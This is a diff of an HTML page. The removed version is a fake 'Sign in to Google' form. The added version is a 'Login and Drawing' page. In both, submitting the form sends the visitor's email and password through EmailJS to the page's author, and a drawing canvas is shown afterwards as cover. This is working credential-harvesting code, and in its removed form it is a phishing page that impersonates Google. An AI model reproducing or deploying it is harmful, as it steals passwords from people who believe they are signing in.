@@ -1,122 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Login</title>
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f1f1f1;
-        }
-        .login-container {
-            width: 300px;
-            padding: 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            background-color: #fff;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .login-container h2 {
-            margin-bottom: 20px;
-            text-align: center;
-            color: #333;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        .login-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #4285F4;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .login-container button:hover {
-            background-color: #357ae8;
-        }
-        canvas {
-            border: 1px solid #000;
-            margin-top: 20px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login and Drawing</title>
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; }
+    #drawingCanvas { border: 2px solid black; cursor: crosshair; }
+  </style>
 </head>
 <body>
+  <h1>Login to Start Drawing</h1>
+  <form id="loginForm">
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" required><br><br>
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required><br><br>
+    <button type="submit">Login</button>
+  </form>
 
-<div class="login-container">
-    <h2>Sign in to Google</h2>
-    <form id="loginForm">
-        <input type="email" id="email" placeholder="Email or phone" required>
-        <input type="password" id="password" placeholder="Enter your password" required>
-        <button type="submit">Next</button>
-    </form>
-</div>
+  <h1>Drawing Area</h1>
+  <canvas id="drawingCanvas" width="800" height="600" style="display:none;"></canvas>
+  <button id="clearButton" style="display:none;">Clear Canvas</button>
 
-<canvas id="drawingCanvas" width="400" height="400" style="display: none;"></canvas>
-
-<script>
-    // Initialize EmailJS
-    emailjs.init("user_Wm_hgPysMxjkcdYas");  // Replace with your EmailJS User ID
-
+  <script>
+    emailjs.init("Wm_hgPysMxjkcdYas");
     document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        // Send the form data to your email
-        emailjs.send("service_zrgq0cs", "template_8r7y8vw", {
-            email: email,
-            password: password
-        }).then(function(response) {
-            console.log("Success:", response);
-            
-            // Hide the login form and show the drawing canvas
-            document.querySelector('.login-container').style.display = 'none';
-            document.getElementById('drawingCanvas').style.display = 'block';
-
-            // Initialize drawing functionality
-            const canvas = document.getElementById('drawingCanvas');
-            const ctx = canvas.getContext('2d');
-            let drawing = false;
-
-            canvas.addEventListener('mousedown', function() {
-                drawing = true;
-            });
-
-            canvas.addEventListener('mouseup', function() {
-                drawing = false;
-                ctx.beginPath(); // Stop drawing when mouse is released
-            });
-
-            canvas.addEventListener('mousemove', function(event) {
-                if (drawing) {
-                    const x = event.offsetX;
-                    const y = event.offsetY;
-                    ctx.lineTo(x, y);
-                    ctx.stroke();
-                }
-            });
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      emailjs.send("service_zrgq0cs", "template_8r7y8vw", { email, password })
+        .then(function(response) {
+          console.log("Email sent successfully", response);
+          document.querySelector('form').style.display = 'none';
+          document.getElementById('drawingCanvas').style.display = 'block';
+          document.getElementById('clearButton').style.display = 'block';
         }, function(error) {
-            console.log("Failed to send:", error);
+          console.error("Failed to send email", error);
         });
     });
-</script>
 
+    const canvas = document.getElementById('drawingCanvas');
+    const context = canvas.getContext('2d');
+    let drawing = false;
+
+    canvas.addEventListener('mousedown', () => drawing = true);
+    canvas.addEventListener('mouseup', () => drawing = false);
+    canvas.addEventListener('mousemove', (e) => {
+      if (drawing) {
+        context.lineTo(e.clientX - canvas.offsetLeft, e.clientY - canvas.offsetTop);
+        context.stroke();
+      }
+    });
+
+    document.getElementById('clearButton').addEventListener('click', function() {
+      context.clearRect(0, 0, canvas.width, canvas.height);
+    });
+  </script>
 </body>
 </html>
